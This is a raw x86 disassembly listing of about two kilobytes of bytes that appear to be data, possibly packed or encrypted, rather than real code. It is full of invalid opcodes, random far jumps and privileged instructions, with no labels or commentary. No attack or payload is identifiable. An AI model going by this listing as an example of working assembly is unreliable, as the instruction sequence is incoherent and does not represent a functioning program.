  419175:	lock or eax,0x538d0199
  41917b:	xor    al,0xe
  41917d:	imul   eax,eax,0x53
  419180:	loop   0x419188
  419182:	jecxz  0x419139
  419184:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  419186:	jb     0x419111
  419188:	mov    bh,0x62
  41918a:	push   0xffffffb5
  41918c:	(bad)
  41918f:	icebp  
  419190:	inc    ebx
  419191:	daa    
  419192:	mov    ss,WORD PTR [ebx-0x5d]
  419195:	jmp    0x9be6ba9a
  41919a:	push   esi
  41919b:	mov    fs,WORD PTR [esi-0x38]
  41919e:	ror    BYTE PTR gs:[ecx+0x257fd897],1
  4191a5:	pop    es
  4191a6:	call   0xb728:0x23a2b9f1
  4191ad:	xlat   BYTE PTR ds:[ebx]
  4191af:	cdq    
  4191b0:	(bad)  [edx+eiz*1]
  4191b3:	and    DWORD PTR [edx+eax*2+0x5f9ce6d4],eax
  4191ba:	icebp  
  4191bb:	pop    esp
  4191bc:	jb     0x41918a
  4191be:	xchg   esi,eax
  4191bf:	test   DWORD PTR [ebx-0x376c2e06],ebx
  4191c5:	fstp   TBYTE PTR [edx+0x667afa83]
  4191cb:	call   0xa8ca:0x1dc8c56c
  4191d2:	loopne 0x419186
  4191d4:	jge    0x419166
  4191d6:	(bad)  
  4191d7:	iret   
  4191d8:	jmp    0x41921c
  4191da:	iret   
  4191db:	in     al,dx
  4191dc:	cmp    ebx,DWORD PTR [ecx+0x42]
  4191df:	cmp    edi,esp
  4191e1:	add    ah,bh
  4191e3:	add    DWORD PTR [ecx+0x2e],0x4b
  4191e7:	inc    eax
  4191e8:	mov    edi,0xeeb6d78c
  4191ed:	scas   al,BYTE PTR es:[edi]
  4191ee:	jnp    0x419230
  4191f0:	adc    al,0x5e
  4191f2:	push   edi
  4191f3:	cmp    eax,0x7967adf8
  4191f8:	pop    ecx
  4191f9:	xor    al,0xec
  4191fb:	mov    ah,0x57
  4191fd:	or     bh,BYTE PTR [ebx+0x56]
  419200:	call   0x8582:0xb1117c41
  419207:	nop
  419208:	(bad)  
  41920a:	adc    eax,0xfdae5325
  41920f:	mov    ds:0x2b74723,al
  419214:	ins    DWORD PTR es:[edi],dx
  419215:	add    eax,0xe564cd8e
  41921a:	xor    edx,DWORD PTR [eax]
  41921c:	adc    al,0x55
  41921e:	imul   ebx,DWORD PTR [edi+esi*4],0xcb9b3e8c
  419225:	mov    eax,DWORD PTR [esi+0x39c5ac1c]
  41922b:	mov    esp,0x2f890824
  419230:	imul   eax,edi,0x35de540f
  419236:	out    dx,al
  419237:	imul   ebp,DWORD PTR [edx+0x7ce7c192],0x84153db4
  419241:	call   0xf9b6df69
  419246:	fist   DWORD PTR [ebx]
  419248:	pop    ebp
  419249:	outs   dx,BYTE PTR ds:[esi]
  41924a:	div    BYTE PTR [edx+ebx*8-0x2]
  41924e:	jmp    0xe97163df
  419253:	mov    eax,0xcb2e5bf1
  419258:	jmp    0xa00c:0x9c5ef7a3
  41925f:	xchg   esp,eax
  419260:	out    dx,eax
  419261:	mov    esp,0x740146dc
  419266:	retf   0xed48
  419269:	mov    dh,0xee
  41926b:	ret    0xdcab
  41926e:	in     al,dx
  41926f:	mov    bl,0x7a
  419271:	into   
  419272:	jle    0x41928c
  419274:	pop    ebx
  419275:	das    
  419276:	leave  
  419277:	jno    0x4192b3
  419279:	into   
  41927a:	mov    ds,WORD PTR [eax]
  41927c:	pop    eax
  41927d:	fwait
  41927e:	jb     0x419219
  419280:	outs   dx,BYTE PTR ds:[esi]
  419281:	jle    0x4192ce
  419283:	ins    BYTE PTR es:[edi],dx
  419284:	or     ebp,DWORD PTR [esp+ecx*2-0x36]
  419288:	pop    eax
  419289:	sbb    ah,bh
  41928b:	into   
  41928c:	xor    dl,BYTE PTR [ecx+0x77]
  41928f:	dec    ecx
  419290:	add    BYTE PTR [eax],0x7c
  419293:	cld    
  419294:	pop    ss
  419295:	inc    ecx
  419296:	imul   esi,DWORD PTR [edx+0x60],0xffffff98
  41929a:	aaa    
  41929b:	sub    eax,0xc05d5674
  4192a0:	(bad)  
  4192a1:	jmp    DWORD PTR [edi-0x2a]
  4192a4:	sbb    DWORD PTR [ecx+edi*1-0x25e1699c],esi
  4192ab:	cmp    BYTE PTR [edi+edi*2],ah
  4192ae:	(bad)
  4192b2:	stc    
  4192b3:	pop    ecx
  4192b4:	add    esp,ebp
  4192b6:	imul   edi,esi,0x6745b302
  4192bc:	xchg   BYTE PTR [edi],dh
  4192be:	and    DWORD PTR ds:0xd958dce8,eax
  4192c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192c5:	pushf  
  4192c6:	sbb    ah,BYTE PTR [esp+ebx*8-0x5129ae8f]
  4192cd:	imul   ecx,DWORD PTR [edx+0xd2880d6],0x95dd874
  4192d7:	fcmovnu st,st(4)
  4192d9:	push   es
  4192da:	sbb    BYTE PTR [eax-0x68c18335],ah
  4192e0:	add    cl,BYTE PTR [ebx-0x9]
  4192e3:	jae    0x4192ad
  4192e5:	pop    ebx
  4192e6:	arpl   WORD PTR [ebp-0x27],sp
  4192e9:	mov    ds:0xe5873bb3,al
  4192ee:	addr16 sahf 
  4192f0:	or     dh,BYTE PTR cs:[edi-0x71]
  4192f4:	pop    ds
  4192f5:	mov    cs,edx
  4192f7:	call   DWORD PTR [ecx-0x233157ab]
  4192fd:	ins    DWORD PTR es:[edi],dx
  4192fe:	aad    0x56
  419300:	loopne 0x419347
  419302:	test   dh,ah
  419304:	xchg   ebx,eax
  419305:	push   ebp
  419306:	int    0x31
  419308:	dec    esp
  419309:	add    eax,0x3b10fbc1
  41930e:	cmc    
  41930f:	sub    al,0xaf
  419311:	pop    ds
  419312:	pushf  
  419313:	iret   
  419314:	ins    DWORD PTR es:[edi],dx
  419315:	mov    ch,0xfb
  419317:	sbb    BYTE PTR [eax-0x65],cl
  41931a:	fwait
  41931b:	or     ecx,ebp
  41931d:	jmp    0x7e62:0xb6c0d6ca
  419324:	adc    esi,DWORD PTR gs:[ebp+eiz*2-0x4206e75e]
  41932c:	pop    edi
  41932d:	sub    ah,BYTE PTR [ebx+0x9]
  419330:	pop    ecx
  419331:	or     DWORD PTR [edi],esp
  419333:	(bad)  
  419334:	cmp    DWORD PTR [ebp-0xb94affc],esp
  41933a:	mov    ebp,0x3d7e927
  41933f:	push   edi
  419340:	jns    0x41937d
  419342:	outs   dx,DWORD PTR ds:[esi]
  419343:	mov    ah,0xa3
  419345:	repnz dec ebx
  419347:	pusha  
  419348:	int3   
  419349:	add    eax,DWORD PTR [eax]
  41934b:	and    BYTE PTR ds:0xab3f628c,0xaf
  419353:	adc    al,0x2d
  419355:	mul    DWORD PTR [eax]
  419357:	mul    DWORD PTR [ebx-0x72d3e892]
  41935d:	pop    ss
  41935e:	xor    esi,DWORD PTR [ecx]
  419360:	inc    edx
  419361:	loopne 0x41937c
  419363:	(bad)  
  419364:	push   ds
  419365:	and    edi,DWORD PTR [edx]
  419367:	pushf  
  419368:	lock or al,0xd5
  41936b:	mov    esi,edx
  41936d:	push   eax
  41936e:	neg    ch
  419370:	aaa    
  419371:	mov    DWORD PTR [ebx-0x18],edi
  419374:	or     cl,BYTE PTR [esp+edi*1-0x334fe153]
  41937b:	call   0x3b33884d
  419380:	dec    esp
  419381:	mov    eax,0x3f4f1b3f
  419386:	jecxz  0x4193d0
  419388:	lock lods al,BYTE PTR ds:[esi]
  41938a:	pop    es
  41938b:	push   esi
  41938c:	ja     0x4193bf
  41938e:	push   esi
  41938f:	mov    cs,WORD PTR [ecx-0x7e]
  419392:	add    al,0x4e
  419394:	es (bad) 
  419396:	mov    dh,0x75
  419398:	fld    DWORD PTR [edi+ecx*4-0x2]
  41939c:	sbb    al,0x9f
  41939e:	test   DWORD PTR [ebx+0x73959cbc],eax
  4193a4:	(bad)  
  4193a5:	lods   eax,DWORD PTR ds:[esi]
  4193a6:	daa    
  4193a7:	(bad)  
  4193a8:	and    esi,esp
  4193aa:	pop    edi
  4193ab:	dec    bx
  4193ad:	pop    edx
  4193ae:	add    DWORD PTR [eax],ecx
  4193b0:	aad    0xef
  4193b2:	sar    DWORD PTR [esi],0x42
  4193b5:	ss push cs
  4193b7:	cmp    eax,0x69ed0531
  4193bc:	cmp    bh,BYTE PTR [edx]
  4193be:	seta   BYTE PTR [ebx-0x5765baf5]
  4193c5:	test   ah,0x2
  4193c8:	adc    eax,0xe330d74d
  4193cd:	ins    BYTE PTR es:[edi],dx
  4193ce:	daa    
  4193cf:	mov    WORD PTR [edx+0x1b8eeb62],ss
  4193d5:	push   cs
  4193d6:	(bad)  
  4193d7:	jp     0x419372
  4193d9:	repz xchg edi,eax
  4193db:	push   edi
  4193dc:	push   eax
  4193dd:	pusha  
  4193de:	scas   eax,DWORD PTR es:[edi]
  4193df:	push   ds
  4193e0:	jno    0x4193ba
  4193e2:	scas   eax,DWORD PTR es:[edi]
  4193e3:	dec    esp
  4193e4:	test   bh,cl
  4193e6:	out    dx,eax
  4193e7:	or     BYTE PTR [edi*4+0x239f2d55],bl
  4193ee:	clc    
  4193ef:	les    ebx,FWORD PTR [esi-0x12]
  4193f2:	pop    ebx
  4193f3:	inc    edi
  4193f4:	mov    WORD PTR es:[edi-0x22],gs
  4193f8:	loope  0x419414
  4193fa:	dec    eax
  4193fb:	dec    esp
  4193fc:	adc    esp,edi
  4193fe:	or     BYTE PTR [edx+edi*1],0x49
  419402:	jno    0x4193b6
  419404:	daa    
  419405:	or     al,0xfd
  419407:	stc    
  419408:	and    eax,0x11c86d68
  41940d:	inc    ecx
  41940e:	pusha  
  41940f:	push   ebx
  419410:	dec    ebp
  419411:	push   es
  419412:	repnz mov ss,WORD PTR [ebp-0x787e9dd5]
  419419:	call   0x5482a08c
  41941e:	jo     0x41942e
  419420:	jecxz  0x419480
  419422:	mov    ds:0xbb91eea8,al
  419427:	mov    eax,ds:0x1bb16f09
  41942c:	or     DWORD PTR [ebx+edx*8],esp
  41942f:	fild   WORD PTR [ebx+0x37f8b0f1]
  419435:	mov    ds:0x7e92dc0a,al
  41943a:	pop    es
  41943b:	dec    eax
  41943c:	imul   ebp,DWORD PTR [edi-0x1b],0xffffffe3
  419440:	cld    
  419441:	sub    esi,DWORD PTR [eax]
  419443:	push   es
  419444:	ret    
  419445:	in     eax,dx
  419446:	int    0x9e
  419448:	test   cl,ah
  41944a:	cmp    ah,BYTE PTR [edx+edi*8+0x6d9f0f83]
  419451:	inc    ecx
  419452:	sbb    DWORD PTR [ebx],ebx
  419454:	rcr    BYTE PTR [edx-0x46cd6d34],0xa1
  41945b:	into   
  41945c:	mov    al,ds:0x9d2aa6e3
  419461:	xchg   ebp,ebp
  419463:	xchg   esp,eax
  419464:	mov    DWORD PTR [edi+0x32fd92c5],0xa28c1f66
  41946e:	out    0xca,al
  419470:	fcomp  QWORD PTR [ecx]
  419472:	ret    
  419473:	push   ebp
  419475:	(bad)  [eax+0x2c]
  419478:	in     al,dx
  419479:	mov    edx,0xd72b16f8
  41947e:	hlt    
  41947f:	imul   esp,DWORD PTR [esi],0xffffffb9
  419482:	jb     0x419493
  419484:	add    al,0x4b
  419486:	out    0x5,al
  419488:	sbb    WORD PTR [edx-0x4],si
  41948c:	jle    0x4194e6
  41948e:	stos   BYTE PTR es:[edi],al
  41948f:	jle    0x41946a
  419491:	in     eax,0xe5
  419493:	or     cl,BYTE PTR [eax-0x34216860]
  419499:	mov    ecx,0xd5a12bc1
  41949e:	add    eax,0xc8b1df2f
  4194a3:	aas    
  4194a4:	sbb    ebp,0xffffffc5
  4194a7:	outs   dx,BYTE PTR ds:[esi]
  4194a8:	(bad)
  4194ab:	shr    DWORD PTR [esi+edx*1-0x10],cl
  4194af:	mov    DWORD PTR [esi],0x7a076dda
  4194b5:	dec    edi
  4194b6:	repnz add eax,0xd27f0b55
  4194bc:	(bad)  
  4194bd:	fwait
  4194be:	cmp    ecx,DWORD PTR [edi+0x7]
  4194c1:	aam    0x4
  4194c3:	xchg   esi,eax
  4194c4:	mov    eax,ecx
  4194c6:	dec    ecx
  4194c7:	jae    0x41951c
  4194c9:	stos   BYTE PTR es:[edi],al
  4194ca:	imul   bh
  4194cc:	mov    ch,0x63
  4194ce:	mov    ds:0xf777840f,eax
  4194d3:	xchg   ebx,eax
  4194d4:	or     al,0x4e
  4194d6:	aam    0xb2
  4194d8:	sahf   
  4194d9:	arpl   WORD PTR [ebx-0x5d],bp
  4194dc:	and    cl,BYTE PTR [ebp+0x6b]
  4194df:	gs sahf 
  4194e1:	icebp  
  4194e2:	adc    bh,bh
  4194e4:	lds    ebx,FWORD PTR [esi]
  4194e6:	sub    bh,cl
  4194e8:	shr    BYTE PTR [esi+0x7a],cl
  4194eb:	(bad)  
  4194ec:	cli    
  4194ed:	mov    eax,0x2f58e8b8
  4194f2:	or     dl,BYTE PTR [esi-0x5f]
  4194f5:	jle    0x4194c8
  4194f7:	inc    ebx
  4194f8:	int3   
  4194f9:	jle    0x419492
  4194fb:	mov    eax,0x54122484
  419500:	inc    eax
  419501:	retf   0x6590
  419504:	(bad)  
  419505:	dec    ebx
  419506:	jne    0x419529
  419508:	push   0xffffffe2
  41950a:	shr    DWORD PTR [eax+0xc],0x7f
  41950e:	(bad)  
  41950f:	das    
  419510:	xchg   ebx,eax
  419511:	mov    edi,0xc956d315
  419516:	icebp  
  419517:	cdq    
  419518:	and    al,0xd2
  41951a:	xchg   ebx,eax
  41951b:	outs   dx,DWORD PTR ds:[esi]
  41951c:	xchg   BYTE PTR [edi+0x54],bl
  41951f:	pop    ebx
  419520:	xchg   esp,eax
  419521:	or     DWORD PTR ds:0xb528fe64,0xc5428459
  41952b:	leave  
  41952c:	xor    esp,DWORD PTR [edx-0x4]
  41952f:	and    ebx,esi
  419531:	cmp    DWORD PTR [ecx],eax
  419533:	fsub   st(6),st
  419535:	inc    ecx
  419536:	inc    ebx
  419537:	ret    0x1807
  41953a:	rcr    dh,0x42
  41953d:	mov    cl,0x85
  419540:	test   BYTE PTR [eax-0x3c],0x25
  419544:	(bad)  
  419545:	enter  0xd6ef,0x5a
  419549:	aam    0x34
  41954b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41954c:	fisttp WORD PTR [ebx-0x5e71ebc0]
  419552:	push   esp
  419553:	out    0xf,eax
  419555:	xor    al,BYTE PTR [eax+0x76cc653]
  41955b:	inc    esi
  41955c:	xor    eax,0xb1542647
  419561:	mov    edi,0xfc0761f1
  419566:	rcl    eax,cl
  419568:	dec    ebp
  419569:	mov    al,0x41
  41956b:	sub    al,0x78
  41956d:	and    eax,0x4073bec1
  419572:	rcr    ecx,1
  419574:	mov    ch,0x7b
  419576:	pop    edi
  419577:	pop    edi
  419579:	jbe    0x4195b1
  41957b:	cdq    
  41957c:	imul   edx,DWORD PTR [esi-0x33],0x70c4f089
  419583:	out    0xd7,al
  419585:	(bad)  
  419586:	mov    esp,0x47143917
  41958b:	push   eax
  41958c:	jl     0x4195f2
  41958e:	add    al,0x26
  419590:	gs and eax,0xb7359c8a
  419596:	mov    ds:0x43ab85d8,eax
  41959b:	lahf   
  41959c:	add    BYTE PTR [edx],0x4d
  41959f:	into   
  4195a0:	xor    esp,ebx
  4195a2:	cwde   
  4195a3:	mov    ah,al
  4195a5:	fs loopne 0x4195de
  4195a8:	adc    eax,DWORD PTR [edi]
  4195aa:	jnp    0x419578
  4195ac:	xor    esi,DWORD PTR [edx]
  4195ae:	repnz lahf 
  4195b0:	sar    bl,0xe2
  4195b3:	sbb    al,BYTE PTR [eax+0x6f]
  4195b6:	in     al,0xf5
  4195b8:	rol    DWORD PTR [ecx],1
  4195ba:	pop    edi
  4195bb:	push   edx
  4195bc:	data16 cli 
  4195be:	mov    eax,0x3912a6fe
  4195c3:	ja     0x419616
  4195c5:	mov    ds:0x2de95ea5,eax
  4195ca:	loop   0x419572
  4195cc:	jg     0x4195ad
  4195ce:	imul   eax,DWORD PTR [ebx-0x48c93371],0x1e
  4195d5:	jmp    0x908c:0x6b34ffb6
  4195dc:	sti    
  4195dd:	or     al,0xa9
  4195df:	mov    dl,0x8e
  4195e1:	sub    BYTE PTR ds:0x5ab04921,0x60
  4195e8:	ret    
  4195e9:	or     bl,BYTE PTR [ecx-0x39894e13]
  4195ef:	cmp    ch,BYTE PTR [esi]
  4195f1:	mov    al,ds:0x63dc2bb4
  4195f6:	mov    ch,0x39
  4195f8:	leave  
  4195f9:	retf   0xd5bd
  4195fc:	push   edi
  4195fd:	push   edx
  4195fe:	sub    ebp,DWORD PTR [ebx]
  419600:	adc    DWORD PTR [esi+0x6b],esp
  419603:	sub    dl,BYTE PTR [ecx]
  419605:	and    al,0x87
  419607:	jbe    0x41967e
  419609:	test   eax,0x2f56dfac
  41960e:	in     al,dx
  41960f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419610:	popa   
  419611:	inc    ebx
  419612:	fild   QWORD PTR [eax]
  419614:	loopne 0x419668
  419616:	les    edx,FWORD PTR [edx-0xd5a683e]
  41961c:	leave  
  41961d:	mov    esi,0xa61fcae2
  419622:	pop    es
  419623:	mov    esi,0xb2459bde
  419628:	mov    dl,0xe5
  41962a:	sti    
  41962b:	adc    al,0xb8
  41962d:	sbb    al,0xf8
  41962f:	adc    eax,0x97206bf4
  419634:	and    eax,0xb558689d
  419639:	stos   DWORD PTR es:[edi],eax
  41963a:	icebp  
  41963b:	aaa    
  41963c:	(bad)  [ebx]
  41963e:	mov    fs,WORD PTR [ecx+0x23]
  419641:	fiadd  DWORD PTR [edx+0x2f]
  419644:	(bad)  
  419645:	lahf   
  419646:	mov    DWORD PTR [esi+ebp*2],0x5f41be19
  41964d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41964e:	nop
  41964f:	pushf  
  419650:	cmp    DWORD PTR [esi],ebp
  419652:	test   DWORD PTR ds:0x5f31663a,eax
  419658:	jp     0x4196cb
  41965a:	mov    eax,0x5d25ee6
  41965f:	xor    ebp,edi
  419661:	sub    ecx,DWORD PTR [ebx+0x385960b6]
  419667:	mov    ecx,0x9551f348
  41966c:	stos   DWORD PTR es:[edi],eax
  41966d:	or     DWORD PTR [ebx-0x25],edx
  419670:	(bad)  [eax-0x74]
  419673:	sub    ah,bh
  419675:	xor    al,0xf7
  419677:	jne    0x419639
  419679:	jb     0x419696
  41967b:	inc    esp
  41967c:	faddp  st(6),st
  41967e:	lock jl 0x41968d
  419681:	mov    eax,ds:0xcde2ebbb
  419686:	mov    ds:0x85a93647,al
  41968b:	out    dx,al
  41968c:	adc    edx,DWORD PTR [edx-0x51]
  41968f:	xor    al,0x6e
  419691:	inc    edx
  419692:	lahf   
  419693:	scas   eax,DWORD PTR es:[edi]
  419694:	cmp    DWORD PTR [edx+0x4af0170c],eax
  41969a:	sar    DWORD PTR [eax],0x6f
  41969d:	jnp    0x41964d
  41969f:	inc    esp
  4196a0:	shr    dl,1
  4196a2:	jo     0x419647
  4196a4:	push   ss
  4196a5:	jb     0x41968a
  4196a7:	mov    ebx,DWORD PTR [ecx-0x2a]
  4196aa:	dec    esp
  4196ab:	sahf   
  4196ac:	icebp  
  4196ad:	shl    BYTE PTR [eax],0x68
  4196b0:	dec    eax
  4196b1:	leave  
  4196b2:	aaa    
  4196b3:	leave  
  4196b4:	mov    ds:0x96539a2c,al
  4196b9:	push   ds
  4196ba:	fucom  st(7)
  4196bc:	in     eax,0x8
  4196be:	xchg   ebp,eax
  4196bf:	loope  0x419659
  4196c1:	out    0xc0,eax
  4196c3:	dec    ecx
  4196c4:	xchg   edx,eax
  4196c5:	adc    edi,ebx
  4196c7:	ins    DWORD PTR es:[edi],dx
  4196c8:	loop   0x4196a2
  4196ca:	sub    eax,0x863b7e66
  4196cf:	je     0x41967b
  4196d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196d2:	out    0xee,al
  4196d4:	push   esi
  4196d5:	mov    cl,0xc
  4196d7:	gs inc esp
  4196d9:	mov    edx,0xcba328b4
  4196de:	icebp  
  4196df:	addr16 jno 0x4196f6
  4196e2:	aas    
  4196e3:	out    dx,eax
  4196e4:	pop    ebx
  4196e5:	add    BYTE PTR [ebx+0x28],ch
  4196e8:	out    dx,eax
  4196e9:	mov    ?,WORD PTR [esi+ecx*8]
  4196ec:	xor    eax,0x656921c9
  4196f1:	int    0xeb
  4196f3:	xchg   ebp,eax
  4196f4:	mov    cl,0xb9
  4196f6:	jno    0x419707
  4196f8:	es add al,0x18
  4196fb:	cmp    bl,BYTE PTR [ebp+edx*4+0x388e8adb]
  419702:	or     al,0x8a
  419704:	mov    eax,ds:0x4a4b27a5
  419709:	fsub   st,st(5)
  41970b:	das    
  41970c:	xor    DWORD PTR [ecx-0x79bfb3e2],esi
  419712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419713:	xor    DWORD PTR [ebp-0x1c3ae470],edi
  419719:	into   
  41971a:	scas   eax,DWORD PTR es:[edi]
  41971b:	scas   al,BYTE PTR es:[edi]
  41971c:	gs out dx,al
  41971e:	xchg   esi,eax
  41971f:	nop
  419720:	shr    edi,1
  419722:	mov    cl,0x1a
  419724:	add    eax,0x2630b66d
  419729:	xor    al,0xa1
  41972b:	mov    dl,0xc9
  41972d:	pcmpeqw mm3,mm6
  419730:	mov    ebp,eax
  419732:	xor    dl,BYTE PTR [edx-0x5a539e7a]
  419738:	cmp    al,0xe7
  41973a:	mov    eax,ds:0x8fd0297d
  41973f:	xlat   BYTE PTR ds:[ebx]
  419741:	cmp    BYTE PTR [ecx-0x79],ah
  419744:	xchg   edi,eax
  419745:	sub    BYTE PTR [edx+0x7803744e],ch
  41974b:	xchg   esi,eax
  41974c:	ret    
  41974d:	or     eax,0x259af51b
  419752:	add    ebp,DWORD PTR ds:0xb0a18731
  419758:	fst    QWORD PTR [esp+edx*1]
  41975b:	iret   
  41975c:	ds je  0x41970a
  41975f:	pop    edi
  419760:	fdiv   QWORD PTR [ecx+edi*1-0x49d70d3f]
  419767:	psllq  mm6,QWORD PTR [edi+0x4f]
  41976b:	and    ecx,esp
  41976d:	xchg   esp,eax
  41976e:	dec    edx
  41976f:	dec    ecx
  419770:	mov    edx,0x702ac6c3
  419775:	out    0xdc,al
  419777:	pop    ecx
  419778:	les    esp,FWORD PTR [ecx-0x3b8e53d2]
  41977e:	fnstsw WORD PTR [ecx-0x427d85a6]
  419784:	sbb    DWORD PTR [esi-0x3d],ecx
  419787:	mov    dh,0xac
  419789:	push   0x4b44a97f
  41978e:	fwait
  41978f:	loopne 0x419772
  419791:	add    al,0x4
  419793:	les    ebx,FWORD PTR [ebx]
  419795:	stos   DWORD PTR es:[edi],eax
  419796:	mov    edx,0xbb3adcae
  41979b:	shr    bl,0x56
  41979e:	sub    ebp,DWORD PTR [eax+0x65]
  4197a1:	sub    ah,BYTE PTR [edx+0xa8b7214]
  4197a7:	add    ecx,0x6ff2d05a
  4197ad:	sbb    BYTE PTR [ebx-0x6ce6fb03],dl
  4197b3:	mov    esi,0xe21787d4
  4197b8:	jae    0x41978a
  4197ba:	jl     0x419766
  4197bc:	pop    edi
  4197bd:	ret    
  4197be:	sbb    BYTE PTR [eax-0x50],ch
  4197c1:	jae    0x419771
  4197c3:	retf   0x5f3b
  4197c6:	shr    ah,1
  4197c8:	dec    esi
  4197c9:	sub    bl,bh
  4197cb:	stos   BYTE PTR es:[edi],al
  4197cc:	(bad)  
  4197cd:	in     al,dx
  4197ce:	ds and dh,dh
  4197d1:	shl    edx,1
  4197d3:	cmp    ecx,DWORD PTR [ebp-0x6d]
  4197d6:	(bad)  
  4197d7:	arpl   WORD PTR [edi],di
  4197d9:	js     0x41979a
  4197db:	dec    DWORD PTR [eax+0x37]
  4197de:	mov    eax,0xa6dccc1b
  4197e3:	fwait
  4197e4:	call   0x7dac1099
  4197e9:	mov    ds:0x92e1d4d4,eax
  4197ee:	mov    eax,ds:0xe69d89e7
  4197f3:	inc    esp
  4197f4:	mov    esi,0xdbafbe74
  4197f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197fa:	cli    
  4197fb:	dec    esp
  4197fc:	test   dl,ch
  4197fe:	pop    esp
  4197ff:	neg    DWORD PTR [esi+ecx*1+0x3aa71721]
  419806:	mov    edi,0xab59a377
  41980b:	fdivr  st,st(0)
  41980d:	and    al,0x9c
  41980f:	mov    bl,0x54
  419811:	ja     0x41979b
  419813:	jns    0x4197f5
  419815:	and    BYTE PTR [ebx+0xd2a4b9e],bl
  41981b:	inc    esp
  41981c:	int    0x38
  41981e:	xor    DWORD PTR [ebx],ebp
  419820:	and    esp,0x40773ce7
  419826:	and    eax,0x72d78cdc
  41982b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41982c:	xchg   DWORD PTR [ebx],eax
  41982e:	cdq    
  41982f:	mov    bl,0x62
  419831:	pushf  
  419832:	ror    BYTE PTR [esi+0x71],1
  419835:	pop    edx
  419836:	fidivr WORD PTR [edi]
  419838:	sbb    BYTE PTR [esi],ah
  41983a:	ins    DWORD PTR es:[edi],dx
  41983b:	(bad)  
  41983c:	outs   dx,BYTE PTR ds:[esi]
  41983d:	push   es
  41983e:	out    0x21,al
  419840:	mov    ds:0x45db2322,eax
  419845:	into   
  419846:	jmp    0xa859:0x73e0ffc8
  41984d:	ins    BYTE PTR es:[edi],dx
  41984e:	push   ss
  41984f:	and    BYTE PTR [eax],bh
  419851:	pop    esp
  419852:	xchg   dh,dh
  419854:	dec    esi
  419855:	fs mov esp,0x46255cd3
  41985b:	mov    eax,0xd01db0eb
  419860:	mov    edi,0x7d502fac
  419865:	call   0x3eaf2488
  41986a:	cld    
  41986b:	daa    
  41986c:	ja     0x41987a
  41986e:	jae    0x419854
  419870:	lahf   
  419871:	inc    eax
  419872:	jo     0x41983d
  419874:	mov    ds:0x578ef9d6,al
  419879:	leave  
  41987a:	push   edi
  41987b:	pop    ecx
  41987c:	je     0x419814
  41987e:	(bad)  
  419880:	mov    cl,0xa8
  419882:	lods   al,BYTE PTR ds:[esi]
  419883:	push   cs
  419884:	dec    esp
  419885:	jl     0x419878
  419887:	enter  0xf1c5,0xca
  41988b:	push   esi
  41988c:	inc    esi
  41988d:	out    dx,eax
  41988e:	fidiv  WORD PTR [esp+ecx*2-0x34bdca2e]
  419895:	adc    DWORD PTR [eax],ebx
  419897:	dec    edx
  419898:	repnz push 0x4400fce9
  41989e:	or     BYTE PTR [ebx],0x27
  4198a1:	push   ds
  4198a2:	int3   
  4198a3:	sub    al,0x86
  4198a5:	hlt    
  4198a6:	mul    DWORD PTR [ebp-0x17]
  4198a9:	rcl    DWORD PTR [eax+ebx*4+0x0],1
  4198ad:	push   es
  4198ae:	sbb    al,0x5f
  4198b0:	cmp    dl,al
  4198b2:	add    DWORD PTR ds:0x6a32cfe0,0xffffffdf
  4198b9:	jne    0x419869
  4198bb:	sub    eax,0x88b4f339
  4198c0:	dec    esp
  4198c1:	sbb    DWORD PTR ds:0xeae254b9,eax
  4198c7:	leave  
  4198c8:	ss jne 0x41988e
  4198cb:	mov    ah,0x28
  4198cd:	jbe    0x4198da
  4198cf:	jb     0x41991b
  4198d1:	jl     0x4198ab
  4198d3:	cld    
  4198d4:	xor    eax,0x6670bb69
  4198d9:	daa    
  4198da:	and    cl,BYTE PTR [ebx-0x5a5ba355]
  4198e0:	inc    ebp
  4198e1:	not    BYTE PTR [eax+ecx*1-0x59f6f874]
  4198e8:	(bad)
  4198ec:	sub    ch,BYTE PTR [edx+0x7d5b4fd2]
  4198f2:	ret    
  4198f3:	pop    es
  4198f4:	sub    DWORD PTR [esi],edx
  4198f6:	ja     0x4198d0
  4198f8:	mov    cl,0xe4
  4198fa:	jmp    0x14e4e560
  4198ff:	int    0x85
  419901:	retf   
  419902:	and    ebp,DWORD PTR [ebx+edx*2+0x41]
  419906:	pop    ebp
  419907:	rol    DWORD PTR [esi+ebp*1+0x215cc81],1
  41990e:	lahf   
  41990f:	inc    ebp
  419910:	mov    al,0x29
  419912:	xchg   esp,eax
  419913:	dec    eax
  419914:	pop    ss
  419915:	mov    ebx,0x7de85c76
  41991a:	push   es
  41991b:	scas   eax,DWORD PTR es:[edi]
  41991c:	inc    ebx
  41991d:	or     DWORD PTR [edi-0xecb2839],esp
  419923:	xchg   esp,eax
  419924:	ins    DWORD PTR es:[edi],dx
  419925:	jl     0x4198f9
  419927:	stos   DWORD PTR es:[edi],eax
  419928:	mov    BYTE PTR [ebp-0x45],0x11
  41992c:	mov    bh,0x52
  41992e:	pop    ds
  41992f:	lock fdivr QWORD PTR [ecx+0x63]
  419933:	xlat   BYTE PTR ds:[ebx]
  419934:	inc    edi
  419935:	xchg   ebp,eax
  419936:	xor    DWORD PTR [eax],esi
  419938:	dec    esp
  419939:	test   dl,0x4f
  41993c:	scas   eax,DWORD PTR es:[edi]
  41993d:	test   eax,0xda314bc8
  419942:	dec    edx
  419943:	inc    esp
  419944:	(bad)  
  419945:	nop
  419946:	retf   
  419947:	fninit 
  419949:	fidiv  WORD PTR [ecx+0x7f7fb5c6]
  41994f:	xchg   bh,bl
  419951:	fdiv   QWORD PTR [edi+edi*2]
  419954:	pop    ecx
  419955:	loop   0x419948
  419957:	xor    ah,BYTE PTR [esi+edx*4]
  41995a:	arpl   cx,dx
  41995c:	stos   DWORD PTR es:[edi],eax
  41995d:	ins    DWORD PTR es:[edi],dx
  41995e:	xor    DWORD PTR [ebx+0xb],ecx
  419961:	adc    ch,BYTE PTR [ecx+eiz*1]
  419964:	imul   edi,edi,0x517072db
  41996a:	adc    ebx,0xb92ab742
  419970:	sbb    cl,BYTE PTR [ebx+0x7e711611]
  419976:	add    BYTE PTR [edi],0x8e
  419979:	das    
  41997a:	adc    edx,DWORD PTR [edx]
